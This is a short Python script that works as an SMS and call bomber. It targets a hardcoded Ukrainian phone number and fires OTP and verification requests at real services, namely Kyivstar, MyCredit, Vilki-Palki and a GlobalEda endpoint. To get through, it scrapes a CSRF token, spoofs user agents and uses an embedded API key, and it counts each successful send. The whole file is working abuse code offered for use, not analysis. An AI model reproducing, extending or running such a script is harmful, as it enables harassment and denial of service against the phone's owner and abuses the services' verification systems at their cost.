import requests
from fake_useragent import UserAgent
from bs4 import BeautifulSoup
import random
import names

ua = UserAgent()

telephone = "380685323003"
success_send = 0


for i in range(1):
    # ACCOUNT KIYVSTAR SMS
    req = requests.get(f'https://account.kyivstar.ua/cas/new/api/auth/details/{telephone}').json()
    if req['authMethod'] == 'OTP':
        print('[+] ACCOUNT KIYVSTAR')
        success_send = success_send+1
    else:
        print('[-] ACCOUNT KIYVSTAR')

    # MYCREDIT CALL
    session = requests.session()
    main_site = session.get('https://mycredit.ua/ua/login/')
    soup = BeautifulSoup(main_site.content, 'lxml')
    csrf_token = soup.find('meta', attrs={'name': 'csrf-token'})['content']
    req = session.post('https://mycredit.ua/ua/ajax/', json={"_token":csrf_token,"data":'{"typeData":"login","data":{"phone":"'+telephone+'","step":"verificationMethod","method":"2"}}'}).json()
    if req['success'] == True:
        print('[+] MYCREDIT CALL')
        success_send = success_send+1
    else:
        print('[-] MYCREDIT CALL')

    # VILKI-PALKI SMS
    req = requests.post('https://vilki-palki.od.ua/api/secret/generate/new?lang=russian',json={"phone":telephone,"key":"YGFoblFcXVQXVllBbgAFUl1SB1IDAlI="})
    if req.status_code == 200:
        print('[+] VILKI-PALKI SMS')
        success_send = success_send+1
    else:
        print('[-] VILKI-PALKI SMS')

    # GlobalEda SMS
    req = requests.post('https://prod.salesbox.me/api/v5/companies/globaleda/send-otp?lang=uk', json={"phone":telephone})
    if req.status_code == 200:
        print('[+] GlobalEda SMS')
        success_send = success_send+1
    else:
        print('[-] GlobalEda SMS')
        pass
